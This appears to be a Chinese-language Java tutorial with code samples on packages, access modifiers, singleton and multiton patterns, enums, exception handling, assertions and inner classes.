1、定义一个程序类\npackage package3;//jar命令public class Message &#123;    public String getContent()&#123;        return &quot;mes9s0&quot;;    &#125;&#125;\n\n​    2、对程序进行编译与打包处理：\n​        对程序打包编译：javac -d . Message\n​        此时会形成cn的包，包里面有相应的子包与*.class文件，将其打包为my.jar\n​    3、每一个*.jar文件都是一个独立的程序路径，如果想在Java程序之中使用此路径，则必须使用CLASSPATH进行配置\n​    4、运行。\n​    如果没有配置正确则会出现NoClassDefFoundError错误，出现这种错误只有一种情况：*.jar包没有配置正确。\n​    在JDK1.9以前实际上提供的是一个所有类的*.jar文件（rt.jar、tools.jar);只要启动了java虚拟机，就会加载。\n​    在JDK1.9之后，将一个很大的*.jar文件变成了若干个模块文件。这样在启动的时候可以根据程序加载指定的模块，启动速度会变快。\n系统常见包​    java语言从发展至今一直提供有大量的支持类库，那么这些类库一般由两个方面组成：\n​    1、Java自身提供的（除了JDK提供的类库之外还会有一些标准）；\n​    2、由第三方厂商提供的Java支持类库，可以完成各种你所需要的功能，并且支持的厂商很多；\n​    而在JDK中也会有大量的类库，并且类库封装在不同的开发包之中的。\n​    — java.lang：像String、Number、Object等类都在这个包里面，这个包在JDK1.1之后自动导入。\n​    — java.lang.reflect：反射机制处理包，所有的设计从此开始；\n​    — java.util：工具类的定义，包括数据结构的定义；\n​    — java.io：输入与输出流操作的程序包；\n​    — java.net：Java网络编程的包；\n​    — java.sql：进行数据库编程的开发包；\n​    — java.applet：Java的最原始的使用形式，直接嵌套在网页上执行的程序类。现在的程序已经以Application为主了（由主方法的程序）；\n​    — java.awt、javax.swing：Java的图形界面开发包（GUI）\n访问控制权限​    在面向对象的开发过程之中有三大主要特点：封装、继承、多态。对于封装性而言主要的实现依靠的就是访问控制权限。而访问控制权限在程序之中一共定义有四种：private、default（不写）、protected、public，这四种权限的作用如下。\n\n\n\nNo.\n访问范围\nprivate\ndefault\nprotected\npublic\n\n\n\n1\n同一包中的同一类\n🉑️\n🉑️\n🉑️\n🉑️\n\n\n2\n同一包中的不同类\n\n🉑️\n🉑️\n🉑️\n\n\n3\n不同包的子类\n\n\n🉑️\n🉑️\n\n\n4\n不同包的所有类\n\n\n\n🉑️\n\n\n​    在整个访问控制权限的处理之中，只有protected（受保护）的权限是比较新的概念，那么下面对这一访问权限的使用进行说明：\n范例：定义两个类：\n​    1、cn.mldn.a.Message类：提供有protected访问权限\n​    2、cn.mldn.b.NetMessage类：将直接访问protected属性\npackage cn.mldn.a;public class Message &#123;    protected String info = &quot;mes9s0&quot;;&#125;\n\n​    定义子类与父类不在同一个包中\npackage cn.mldn.b;import cn.mldn.a.Message;public class NetMessage extends Message&#123;    public void print()&#123;        System.out.println(super.info);    &#125;&#125;\n\n​    编写测试类，通过子类实现操作：\npackage cn.mldn.test;import cn.mldn.b.NetMessage;public class TestMessage &#123;    public static void main(String[] args) &#123;        new NetMessage().print();//输出mes9s0    &#125;&#125;\n\n​    此时的程序是通过子类访问了父类中的protected属性。但是如果此时直接通过Message访问info属性，就会错误。\npackage cn.mldn.test;import cn.mldn.a.*;public class TestMessage &#123;    public static void main(String[] args) &#123;        System.out.println(new Message().info);    &#125;&#125;\n\n\n​    在程序之中的封装一般有三个对应的访问权限：private、default、protected，但是如果每次在使用的时候进行区分会很麻烦，下面提供一个参考的方案，有时需要调整。：\n​    只要是进行属性的定义，全部使用private；\n​    只要进行方法的定义，全部使用public。\n\nUML图形​    UML是统一的建模语言，本质就是利用图形化的形式来实现程序类关系的描述。在之前已经画出了大量的，这些图形是按照UML标准进行的，并且最早并且使用最广泛的设计工具：Rational Rose，而后出现了越来越多的设计工具，而像PowerDesigner也可以实现类图的定义。\n类图​    一般情况进行类的描述，往往可以采用三层的结构描述：\n\n​    如果要是一个普通类的名称，往往直接编写即可，而如果是抽象类，往往使用斜体描述。“类名称”，所以为了更加清楚描述，往往在抽象类上再加一个“abstract”。\n​    对于类中的属性可以使用“访问权限 属性名称：属性类型”的格式来进行定义，而对于访问权限基本上重点只考虑三个public（+）、protected（#）、private（-）。\n​    类中的方法采用的格式也是“访问权限 方法名称()：返回值”结构来描述，一般的方法都是public声明。\n​    类图、时序图、用例图软件自己研究。\n\n单例设计模式​    单例设计模式（多例设计模式）主要是一种控制实例化对象产生个数的设计操作。\n单例设计​    如果说现在有一个程序类，假设该程序类的定义如下\n//单例设计模式class Singleton&#123;    public void print()&#123;        System.out.println(&quot;mes9s0&quot;);    &#125;&#125;public class Test38 &#123;    public static void main(String[] args) &#123;        Singleton instanceA = new Singleton();      \tSingleton instanceB = new Singleton();        instanceA.print();      \tinstanceB.print();    &#125;&#125;\n\n​    但是由于某些要求，现在要去Singleton这个类只允许提供有一个实例化对象。那么此时首先控制的就是构造方法。因为所有的新的实例化对象产生了，那么一定要调用构造方法，如果构造方法“没有了”，那么我们自然就没办法产生实例化对象了。\n范例：此时构造方法私有化了\nclass Singleton&#123;    private Singleton()&#123;&#125;//构造方法私有化了    public void print()&#123;        System.out.println(&quot;mes9s0&quot;);    &#125;&#125;public class Test38 &#123;    public static void main(String[] args) &#123;        Singleton instance = null;//声明对象未出错        instance = new Singleton();//实例化出错，java: Singleton() 在 two.Singleton 中是 private 访问控制    &#125;&#125;\n\n​    但是现在是有一个严格要求的：必须有一个实例化对象。所有必须想办法产生一个实例化对象交给客户端调用。那么这个时候的分析如下。\n​    1、private访问权限的主要特点在于：不能再类外部访问，但是可以在类本身访问，所以可以考虑在类的内部调用构造。\npackage two;//单例设计模式class Singleton &#123;    private Singleton instance = new Singleton();//内部    private Singleton() &#123;    &#125;//构造方法私有化了    public void print() &#123;        System.out.println(&quot;mes9s0&quot;);    &#125;&#125;public class Test38 &#123;    public static void main(String[] args) &#123;        Singleton instance = null;//声明对象        //instance = new Singleton();//实例化    &#125;&#125;\n\n​    2、此时Singleton类内部的instance属于一个普通的属性，而普通属性是在有实例化对象之后才会被调用的，而这个时候外部无法产生实例化对象，所以这个属性不能被访问到，那么就必须考虑如何在没有实例化对象的时候获取此属性，那么只有一个属性可以，static属性可以。\npackage two;//单例设计模式class Singleton &#123;    static Singleton instance = new Singleton();    private Singleton() &#123;    &#125;//构造方法私有化了    public void print() &#123;        System.out.println(&quot;mes9s0&quot;);    &#125;&#125;public class Test38 &#123;    public static void main(String[] args) &#123;        Singleton instance = null;//声明对象        instance = Singleton.instance;//实例化        instance.print();    &#125;&#125;\n\n​    3、类中的属性应该封装后使用，所以理论上此时的instance需要被封装起来，那么就需要通过一个static方法获得。\npackage two;//单例设计模式class Singleton &#123;    private static Singleton instance = new Singleton();    private Singleton() &#123;&#125;//构造方法私有化了    public static Singleton getInstance()&#123;        return instance;    &#125;    public void print() &#123;        System.out.println(&quot;mes9s0&quot;);    &#125;&#125;public class Test38 &#123;    public static void main(String[] args) &#123;        Singleton instance = null;//声明对象        instance = Singleton.getInstance();//实例化        instance.print();    &#125;&#125;\n\n​    4、整个代码从头强调的是只有一个实例化，这个时候虽然提供有static的实例化对象，但是这个对象依然可以被重新实例化。所以需要保证此时Singleton类内部的instance无法再次实例化，那么应该使用final定义。\npackage two;//单例设计模式class Singleton &#123;    private static final Singleton INSTANCE = new Singleton();    private Singleton() &#123;&#125;//构造方法私有化了    public static Singleton getInstance()&#123;        return INSTANCE;    &#125;    public void print() &#123;        System.out.println(&quot;mes9s0&quot;);    &#125;&#125;public class Test38 &#123;    public static void main(String[] args) &#123;        Singleton instance = null;//声明对象        instance = Singleton.getInstance();//实例化        instance.print();    &#125;&#125;\n\n​    在很多情况下有些类是不需要重复产生对象的，例如：如果一个程序启动，那么现在肯定需要有一个类负责保存有一些程序加载的数据信息。\n\n​    对于单例设计模式也分为两种：懒汉式、饿汉式。在之前定义的都属于饿汉式。在系统加载类的时候就会自动提供有Singleton类的实例化对象。而还有一种是懒汉式，在第一次使用的时候进行实例化对象处理。\npackage two;//单例设计模式,饿汉class Singleton1 &#123;    private static Singleton1 instance = new Singleton1();//删除final    private Singleton1() &#123;&#125;//构造方法私有化了    public static Singleton1 getInstance()&#123;        if (instance == null)&#123;//第一次使用            instance = new Singleton1();//实例化对象        &#125;        return instance;    &#125;    public void print() &#123;        System.out.println(&quot;mes9s0&quot;);    &#125;&#125;public class Test39 &#123;    public static void main(String[] args) &#123;        Singleton1 instance = null;//声明对象        instance = Singleton1.getInstance();//实例化        instance.print();    &#125;&#125;\n\n​    特点总结：构造方法私有化，类内部提供static方法获取实例化对象，这样不管外部如何操作永远都只有一个实例化对象提供。\n多例设计​    与单例设计模式对应，单例设计模式指的是只保留有一个实例化对象，而多例设计指的是可以保留有多个实例化对象，例如L如果现在要定义一个描述性别的类，那么该对象只有两个：男、女。或者描述颜色基色的类：红蓝绿。这种就可以用多例设计。\n范例：\npackage two;//多例设计模式//定义颜色描述的类class Color &#123;    private static final Color RED = new Color(&quot;红色&quot;);    private static final Color GREEN = new Color(&quot;绿色&quot;);    private static final Color BLUE = new Color(&quot;蓝色&quot;);    private String title;    private Color(String title) &#123;        this.title = title;    &#125;    public static Color getInstance(String color) &#123;        switch (color) &#123;            case &quot;red&quot;:                return RED;            case &quot;green&quot;:                return GREEN;            case &quot;blue&quot;:                return BLUE;            default:                return null;        &#125;    &#125;    public String toString() &#123;        return this.title;    &#125;&#125;public class Test40 &#123;    public static void main(String[] args) &#123;        Color c = Color.getInstance(&quot;green&quot;);        System.out.println(c);    &#125;&#125;\n\n\n枚举​    很多语言都有枚举的概念，但是Java在JDK1.5之后才有枚举的概念。实际的开发中枚举的主要作用是用于定义有限个数对象的一种结构(多例设计)。枚举就属于多例设计，并且其结构比多例设计更加简单。\n定义枚举类​    JDK1.5之后有一个enum的关键字。\n范例：\npackage two;//枚举//枚举类enum Color1&#123;    RED,GREEN,BLUE;//实例化对象&#125;public class Test41 &#123;    public static void main(String[] args) &#123;        Color1 c = Color1.RED;//获取实例化对象        System.out.println(c);    &#125;&#125;\n\n​    此时如果采用了多例设计模式来进行设计，那么需要编写很多的程序代码，这样对于开发的复杂度比较高，毕竟牵扯到构造方法的私有化和静态方法。多例设计模式和枚举设计虽然可以实现相同的功能，但是使用枚举可以在程序编译时判断使用的实例化对象是否存在。\n​    在进行枚举处理的时候还可以利用valuse()方法获取所有的枚举对象进行输出。\n范例：获取所有的枚举对象\npackage two;//枚举//枚举类enum Color1&#123;    RED,GREEN,BLUE;//实例化对象&#125;public class Test41 &#123;    public static void main(String[] args) &#123;        for (Color1 c :Color1.values())&#123;            System.out.println(c);        &#125;    &#125;&#125;\n\n​    上面的代码如果要在多例设计模式的话，就要对象数组了。\n​    从JDK1.5追加了枚举结构之后，就可以在switch之中进行枚举项的判断。\n范例：观察枚举与switch\npackage two;//枚举//枚举类enum Color1 &#123;    RED, GREEN, BLUE;//实例化对象&#125;public class Test41 &#123;    public static void main(String[] args) &#123;        Color1 c = Color1.RED;        switch (c) &#123;            case RED:                System.out.println(&quot;红色&quot;);                break;            case BLUE:                System.out.println(&quot;蓝色&quot;);                break;            case GREEN:                System.out.println(&quot;绿色&quot;);                break;        &#125;    &#125;&#125;\n\n​    多例上是无法实现这种与switch直接相连接的，多例想要实现它就需要编写大量的if语句。\nEnum类​    严格意义上来讲枚举并不属于一种新的结构，它的本质相当于是一个类，但是这个类默认会继承Enum类，首先观察一下Enum类的基本定义。\n类的基本定义：\npublic abstract Enum&lt;E extends Enum&lt;E&gt;&gt;extends Objectimplements Comparable&lt;E&gt;,Serializable\n\n​    现在定义的枚举类的类型就是Enum中所使用的E类型。下面观察下Enum类中的方法：\n\n\n\nNo.\n方法名称\n类型\n\n\n\n\n01\nProtected Enum(String name,int ordinal)\n构造\n传入名字和序号\n\n\n02\npublic final String name()\n普通\n获得对象名字\n\n\n03\nPublic final int ordinal()\n普通\n获得对象序号\n\n\n范例：观察Enum类的存在\npackage two;//观察Enum类存在enum Color2&#123;    RED,GREEN,BLUE;&#125;public class Test42 &#123;    public static void main(String[] args) &#123;        for (Color2 c:Color2.values())&#123;            System.out.println(c.ordinal()+&quot; - &quot; + c.name());        &#125;    &#125;&#125;\n\n\n​    在枚举之中每一个对象的序号都是根据枚举对象的定义顺序来决定的。\n​    下面就有一个问题：请解释enum与Enum的区别\n​    –enum：是从JDK1.5之后提供的一个关键字，用于定义枚举类；\n​    –Enum：是一个抽象类，所以使用enum关键字定义的类就默认继承了此类。\n定义枚举结构​    一直在强调枚举本身属于一种多例设计模式，那么既然是多例设计模式，那么在一个类之中可以定义的结构是非常多的。例如：构造方法、普通方法、属性等，那么这些内容在枚举类中依然可以直接定义，但是需要定义的是：枚举类中定义的构造方法不能够采用非私有化定义（public无法使用）。\npackage two;//定义枚举结构enum Color2&#123;    RED(&quot;红色&quot;),GREEN(&quot;绿色&quot;),BLUE(&quot;蓝色&quot;);//实例化对象,必须在第一行    private String title;//定义属性    private Color2(String title)&#123;        this.title = title;    &#125;    public String toString()&#123;        return this.title;    &#125;&#125;public class Test42 &#123;    public static void main(String[] args) &#123;        for (Color2 c:Color2.values())&#123;            System.out.println(c.ordinal()+&quot; - &quot; + c.name()+&quot; - &quot;+c);        &#125;    &#125;&#125;\n\n\n​    本程序在简化程度上一定要远远高于多例设计模式。除了这种基本的结构之外，在枚举类中也可以实现接口的继承。\n范例：让枚举实现接口：\npackage two;//枚举实现接口interface IMessage4 &#123;    public String getMessage();&#125;enum Color3 implements IMessage4 &#123;    RED(&quot;红色&quot;), GREEN(&quot;绿色&quot;), BLUE(&quot;蓝色&quot;);    private String title;    private Color3(String title) &#123;        this.title = title;    &#125;    public String toString() &#123;        return this.title;    &#125;    public String getMessage() &#123;        return this.title;    &#125;&#125;public class Test43 &#123;    public static void main(String[] args) &#123;        IMessage4 msg = Color3.RED;        System.out.println(msg.getMessage());    &#125;&#125;\n\n​    在枚举类里最有意思的事它可以直接定义抽象方法，并且要求每一个枚举对象都要独立实现覆写此抽象方法。\n​    枚举的定义是非常灵活的，但是在实际的使用之中，枚举更多情况下还是建议他的正确用法，就是定义一个实例对象即可。\n枚举的实际应用​    现在定义一个person类，里面一定有性别，性别肯定不希望用户随意输入，所以使用枚举最合适。\n范例：\npackage two;enum Sex &#123;    MALE(&quot;男&quot;), FEMALE(&quot;女&quot;);    private String title;    private Sex(String title) &#123;        this.title = title;    &#125;    public String toString() &#123;        return this.title;    &#125;&#125;class Person11 &#123;    private String name;    private int age;    private Sex sex;    public Person11(String name, int age, Sex sex) &#123;        this.name = name;        this.age = age;        this.sex = sex;    &#125;    public String toString()&#123;        return &quot;姓名:&quot; + this.name + &quot;年龄：&quot;+this.age+&quot;性别：&quot;+this.sex;    &#125;&#125;public class Test44 &#123;    public static void main(String[] args) &#123;        System.out.println(new Person11(&quot;张三&quot;,20,Sex.MALE));    &#125;&#125;\n\n​    可以发现这个例子枚举可以正常实现，追加几个判断即可，所以对于枚举，愿意用就用，不愿意就不用。\n\n异常的捕获及处理认识异常对程序的影响​    异常指的是导致程序中断执行的一种指令流。那么下面首先来观察没有异常产生的程序结果。\n范例：\npackage two;public class Test45 &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;【1】*****程序开始执行*****&quot;);        System.out.println(&quot;【2】*****数学计算********&quot; + (10 / 2));        System.out.println(&quot;【3】*****程序执行完毕*****&quot;);    &#125;&#125;\n\n​    在程序正常的执行过程中，程序会按照从头到尾的顺序执行。\n范例：异常\npackage two;//异常public class Test45 &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;【1】*****程序开始执行*****&quot;);        System.out.println(&quot;【2】*****数学计算********&quot; + (10 / 0));        System.out.println(&quot;【3】*****程序执行完毕*****&quot;);    &#125;&#125;\n\n\n​    出现错误后，整个程序不会按照既定的方式进行，而是中断了执行。为了保证程序出现非致命错误后程序可以正确完成，我们就需要一个异常机制，保证程序的继续进行。\n\n处理异常​    在Java中我们可以用以下几个关键字来进行异常的处理，可以使用：try、catch、finally这几个关键字来完成，其基本的处理结构如下：\ntry&#123;\t//可能出现异常的语句&#125;[catch(异常类型 异常对象)&#123;\t//异常处理&#125;catch(异常类型 异常对象)&#123;\t//异常处理&#125;catch(异常类型 异常对象)&#123;\t//异常处理&#125; ...][finally &#123;\t不管异常是否处理都要转型&#125;]\n\n​    在此格式之中可以使用的组合为：try..catch、try…catch..finally、try…finally。\n范例：处理异常\npackage two;//异常处理public class Test45 &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;【1】*****程序开始执行*****&quot;);        try &#123;            System.out.println(&quot;【2】*****数学计算********&quot; + (10 / 0));        &#125;catch (ArithmeticException e)&#123;            System.out.println(e);//处理异常        &#125;        System.out.println(&quot;【3】*****程序执行完毕*****&quot;);    &#125;&#125;\n\n\n​    可以发现即使处理了异常，程序也可以正常执行完毕，所以此时的设计属于一个合理设计，但是有一个问题出现了。此时在异常处理的时候直接输出的是一个异常类的对象，那么此时此对象如果直接打印（调用toString（））所得到的异常信息并不完整，那么如果想要得到一个完整的异常信息，则可以使用异常类中提供的printStackTrace()方法完成。\n范例：获取完整异常信息\npackage two;//异常处理public class Test45 &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;【1】*****程序开始执行*****&quot;);        try &#123;            System.out.println(&quot;【2】*****数学计算********&quot; + (10 / 0));        &#125;catch (ArithmeticException e)&#123;            e.printStackTrace();//处理异常        &#125;        System.out.println(&quot;【3】*****程序执行完毕*****&quot;);    &#125;&#125;\n\n\n​    对于异常处理格式可以在最后追加一个finally语句，表示异常处理后的出口，不管是否出现异常都执行。\n范例：使用finally\npackage two;//异常处理public class Test45 &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;【1】*****程序开始执行*****&quot;);        try &#123;            System.out.println(&quot;【2】*****数学计算********&quot; + (10 / 0));        &#125;catch (ArithmeticException e)&#123;            e.printStackTrace();//处理异常        &#125;finally &#123;            System.out.println(&quot;【F】不管是否出现异常都会执行&quot;);        &#125;        System.out.println(&quot;【3】*****程序执行完毕*****&quot;);    &#125;&#125;\n\n​    此时程序中有异常，没有异常也执行finally。\n处理多个异常​    很多时候在程序执行的过程之中可能会产生若干个异常，那么这种情况下也可以使用多个catch进行异常的捕获。现在假设通过初始化的参数来进行两个数学计算数字的设置。\npackage two;//多个异常处理public class Test45 &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;【1】*****程序开始执行*****&quot;);        try &#123;            int x = Integer.parseInt(args[0]);            int y = Integer.parseInt(args[1]);            System.out.println(&quot;【2】*****数学计算********&quot; + (x / y));        &#125;catch (ArithmeticException e)&#123;            e.printStackTrace();//处理异常        &#125;finally &#123;            System.out.println(&quot;【F】不管是否出现异常都会执行&quot;);        &#125;        System.out.println(&quot;【3】*****程序执行完毕*****&quot;);    &#125;&#125;\n\n​    那么对于此时的程序可能出现三类异常：\n​    1、【未处理】程序执行的时候没有输入初始化参数：（注意此时F照常输出、3被中断）\n\n​    2、【未处理】输入的数据不是数字\n\n​    3、【已处理】输入的被除数为0\n\n​    现在即便有了异常处理语句，但是如果没有进行正确的异常捕获，那么程序也会导致中断（finally的代码依然执行），所以在这样的情况下就必须进行多个异常的捕获。\npackage two;//多个异常处理public class Test45 &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;【1】*****程序开始执行*****&quot;);        try &#123;            int x = Integer.parseInt(args[0]);            int y = Integer.parseInt(args[1]);            System.out.println(&quot;【2】*****数学计算********&quot; + (x / y));        &#125;catch (ArithmeticException e)&#123;            e.printStackTrace();//处理异常        &#125;catch (NumberFormatException e)&#123;            e.printStackTrace();        &#125;catch (ArrayIndexOutOfBoundsException e)&#123;            e.printStackTrace();        &#125;        finally &#123;            System.out.println(&quot;【F】不管是否出现异常都会执行&quot;);        &#125;        System.out.println(&quot;【3】*****程序执行完毕*****&quot;);    &#125;&#125;\n\n​    此时开发者都知道已经知道有哪些异常才能写出如上的程序，那么又何必非要用个异常处理呢？直接多写点判断不就可以了。所以以上只是个理想化模版。\n异常处理流程​    在进行异常处理的时候如果将所有可能已经明确知道要产生的异常都进行了捕获，虽然可以得到良好的代码结构，但是编写是非常麻烦的。所以现在要想进行合理异常就必须在异常产生之后程序到底做了哪些处理。\n\n​    1、在程序运行的过程中才会产生异常，而一旦程序执行中产生了异常将自动进行指定类型的异常类对象实例化处理。\n​    2、如果此时程序之中并没有提供有异常处理的支持，则会采用JVM的默认异常处理方式，首先进行异常信息的打印，而后直接退出当前的程序。\n​    3、此时程序中如果存在有异常处理，那么这个产生的异常类的实例化对象将会被try语句所捕获。\n​    4、try捕获到异常之后与其匹配的catch中的异常类型进行依次的比对，如果此时与catch中的捕获异常类型相同，则认为应该用此catch进行异常处理，如果不匹配则继续匹配后续的catch类型，如果不成功，则认为catch无法处理。\n​    5、不管异常是否处理最终都要执行finally语句。但是当执行完成finally的程序之后会进一步判断当前的异常是否已经处理过了，如果处理过了，则继续向后执行其他代码，如果没有处理则交由JVM进行默认处理。\n​    通过分析异常处理流程当中实际上操作的还是一个异常类的实例化对象。那么这个异常类的实例化对象的类型就成为了理解异常处理的核心关键所在，在之前接触过了两种异常：\n\n\n\nArithmeticException\nArrayIndexOutOfBoundsException\n\n\n\n\n\n\n\n​    可以发现在程序之中可以处理的异常的最大的类型就是Throwable，而打开Thorwable观察，里面有两个子类\n​    1、Error：此时程序还未执行出现的错误，开发者无法处理；\n​    2、Exception：程序中出现的异常，开发者可以处理，真正开发中处理的。\n​    通过分析可以发现异常产生的时候会产生异常的实例化对象，那么按照对象的引用原则，可以自动向父类转型，那么如果按照这样的逻辑，实际上所有的异常都可以使用Exception处理。\n范例：简化异常处理\npackage two;//多个异常处理public class Test45 &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;【1】*****程序开始执行*****&quot;);        try &#123;            int x = Integer.parseInt(args[0]);            int y = Integer.parseInt(args[1]);            System.out.println(&quot;【2】*****数学计算********&quot; + (x / y));        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125; finally &#123;            System.out.println(&quot;【F】不管是否出现异常都会执行&quot;);        &#125;        System.out.println(&quot;【3】*****程序执行完毕*****&quot;);    &#125;&#125;\n\n​    当不确定有哪些异常产生的时候，这么处理是最方便的。但是如果这样处理也会产生一个问题，这种形式虽然方便，但是描述的错误信息不明确，所以分开是更明确的处理方式。\n​    ps.在异常处理的时候，要把捕获范围大的异常放在捕获范围小的异常之后。\nthrows关键字​    通过之前的程序可以发现，在执行程序的过程之中有可能会产生异常，但是如果说现在定义了一个方法，就应该明确的告诉使用者，这个方法可能会产生何种异常，那么此时就可以在方法的声明上使用throws来进行异常类型的标注。\n范例：观察throws的使用\npackage two;//throws的使用class MyMath &#123;    //这个代码执行的时候可能会产生异常，如果产生异常了调用处处理    public static int div(int x, int y) throws Exception &#123;        return x / y;    &#125;&#125;public class Test46 &#123;    public static void main(String[] args) &#123;        System.out.println(MyMath.div(10,2));    &#125;&#125;\n\n​    这段代码在编译时会产生如下问题\n\n​    我们对于这样的代码在调用方法时，必须在调用时用try catch捕获\npackage two;//throws的使用class MyMath &#123;    //这个代码执行的时候可能会产生异常，如果产生异常了调用处处理    public static int div(int x, int y) throws Exception &#123;        return x / y;    &#125;&#125;public class Test46 &#123;    public static void main(String[] args) &#123;        try &#123;            System.out.println(MyMath.div(10,2));//输出5        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n​        有异常的情况则会按异常输出\npackage two;//throws的使用class MyMath &#123;    //这个代码执行的时候可能会产生异常，如果产生异常了调用处处理    public static int div(int x, int y) throws Exception &#123;        return x / y;    &#125;&#125;public class Test46 &#123;    public static void main(String[] args) &#123;        try &#123;            System.out.println(MyMath.div(10,0));        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n\n​    主方法本身也是一个方法，那么实际上主方法也可以继续向上抛出。\n范例：在主方法上继续抛出异常\npackage two;//throws的使用class MyMath &#123;    //这个代码执行的时候可能会产生异常，如果产生异常了调用处处理    public static int div(int x, int y) throws Exception &#123;        return x / y;    &#125;&#125;public class Test46 &#123;    public static void main(String[] args) throws Exception&#123;            System.out.println(MyMath.div(10,0));    &#125;&#125;\n\n​    如果主方法继续向上抛出异常，那么就表示此异常将交由JVM负责处理。\nthrow关键字​    与throws对应的还有throw关键字，此关键字的主要作用在于表示手工进行异常的抛出，即：此时将手工产生一个异常类的实例化对象，并且进行异常的抛出处理。\n范例：观察throw的使用\npackage two;//throw的使用public class Test47 &#123;    public static void main(String[] args) &#123;        try &#123;            throw new Exception(&quot;自己抛着玩的对象&quot;);        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n\n​    throw和throws区别：\n​    throw：是在代码块中之用的，主要是手工进行异常对象的抛出；\n​    throws：是在方法定义上使用的，表示将此方法中可能产生的异常明确告诉给调用处，由调用处进行处理。\n异常处理的标准格式​    现在已经学习完成了大部分的异常处理格式：try、catch、finally、throw、throws，那么这些关键字在实际的开发之中我们往往会一起进行使用，下面通过一个具体的程序来进行分析。\n​    现在要求定义一个可以实现除法计算的方法，在这个方法之中开发要求如下：\n​    1、进行数学计算开始与结束的时候进行信息提示；\n​    2、进行计算的过程中有异常则交给调用处处理\npackage two;//异常处理的标准格式class MyMath1 &#123;    //异常被交给调用处处理，则一定要在方法上用throws    public static int div(int x, int y) throws Exception &#123;        int temp = 0;        System.out.println(&quot;*** 【START】除法计算开始&quot;);        try &#123;            temp = x / y;        &#125;catch (Exception e)&#123;            throw e;//向上抛异常处理!!!!!!!!!        &#125;finally &#123;            System.out.println(&quot;*** 【END】  除法计算结束&quot;);        &#125;        return temp;    &#125;&#125;public class Test48 &#123;    public static void main(String[] args) &#123;        try &#123;            System.out.println(MyMath1.div(10,0));        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n\n​    对于此类操作实际上可以简化，省略掉catch与throw的操作\npackage two;//异常处理的标准格式class MyMath1 &#123;    //异常被交给调用处处理，则一定要在方法上用throws    public static int div(int x, int y) throws Exception &#123;        int temp = 0;        System.out.println(&quot;*** 【START】除法计算开始&quot;);        try &#123;            temp = x / y;        &#125;finally &#123;            System.out.println(&quot;*** 【END】  除法计算结束&quot;);        &#125;        return temp;    &#125;&#125;public class Test48 &#123;    public static void main(String[] args) &#123;        try &#123;            System.out.println(MyMath1.div(10,0));        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n​    这个代码和上面代码结果一致。在以后的开发过程中，这种异常的处理格式是最为重要的，尤其是当进行一些资源访问的时候尤其重要。\nRuntimeException​    通过之前的分析可以发现只要方法后面带有throws的往往都是告诉用户本方法可能产生的异常是什么，所以这个时候来观察一段代码。\npackage two;//RuntimeExceptionpublic class Test49 &#123;    public static void main(String[] args) &#123;        int num = Integer.parseInt(&quot;123&quot;);        System.out.println(num);    &#125;&#125;\n\n​    下面打开Integer类中的parseInt()方法的定义来观察：\n\n​    这个方法上明确的抛出了一个异常，但是在处理的时候并没有强制性要求处理。下面我们观察一下NumberFormatException类的继承结构。同时也观察数学计算异常的继承结构。\n\n\n\nArithmeticException\nNumberFormatException\n\n\n\n\n\n\n\n​    如果现在所有的程序执行上只要使用了throws定义的方法都必须要求开发者进行手工处理，所以为了代码编写，提供有一个灵活可以选择的异常处理父类“RuntimeException”，这个类的异常的子类可以不需要强制性处理。\n​    RuntimeException和Exception的区别：\n​    RuntimeException是Exception的子类；RuntimeException异常可以不需要强制性处理，而Exception异常必须强制性处理；\n​    可以列举出几个常见的RuntimeException：\n​    1、NumberFormatException。2、ClassCastException。3、NullPointerException等等\n自定义异常类​    在JDK中有大量的异常类型，但是在实际的开发中可能这些异常类型未必够使用，因为不可能所有的都只抛出Exception，这时就要考虑自定义异常类。对于自定义异常有两种方案：1、继承Exception。2、继承RuntimeException\npackage two;//自定义异常class BombException extends Exception&#123;    public BombException(String msg)&#123;        super(msg);    &#125;&#125;class Food&#123;    public static void eat(int num) throws BombException&#123;        if (num &gt; 10)&#123;            throw new BombException(&quot;吃太多了，肚子爆了&quot;);        &#125;else &#123;            System.out.println(&quot;正常开始吃不怕&quot;);        &#125;    &#125;&#125;public class Test49 &#123;    public static void main(String[] args) &#123;        try &#123;            Food.eat(11);        &#125;catch (BombException e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n\nassert断言​    从JDK1.4开始有断言的功能，确定代码执行到某行之后一定是所期待的结果。在实际的开发中，对于断言并不一定是准确的，可能会偏差，这种偏差不应该影响程序的正常执行。\n范例：断言的使用\npackage two;//assert断言public class Test50 &#123;    public static void main(String[] args) &#123;        int x =10;        //中间会经过许多的x变量的操作步骤        assert  x ==100:&quot;x的内容不是100&quot;;        System.out.println(x);    &#125;&#125;\n\n\n​    我们在执行的的时候执行java -ea test.java就可以开启断言\n\n​    所以在Java里并没有将断言设置为一个程序必须执行的步骤，需要在特定的环境下才可以。\n\n内部类​    虽然在类之中的基本组成就是成员属性与方法，但是在任何的语言里面结构也是允许嵌套的，所以在一个类的内部可以定义其他的类，这样的类就称为内部类。\n内部类基本概念​    如果说到内部类肯定其本身是一个独立且完善的类结构，在一个类的内部出了属性和方法之外可以继续使用class定义内部的类。\n范例：内部类的基本定义\npackage two;//内部类的基本概念class Outer &#123;//外部类    private String msg = &quot;mes9s0&quot;;    public void fun() &#123;//普通方法        Inner in = new Inner();//实例化内部类对象        in.print();    &#125;    class Inner&#123;//在Outer类的内部定义了Inner类        public void print()&#123;            System.out.println(Outer.this.msg);//输出Outer类中的属性        &#125;    &#125;&#125;public class Test51 &#123;    public static void main(String[] args) &#123;        Outer out = new Outer();//实例化外部类        out.fun();//调用外部类中的方法    &#125;&#125;\n\n​    从整个的代码上实际上发现内部类的结构并不难理解，甚至可以说其结构与普通类一样清晰明了。\n​    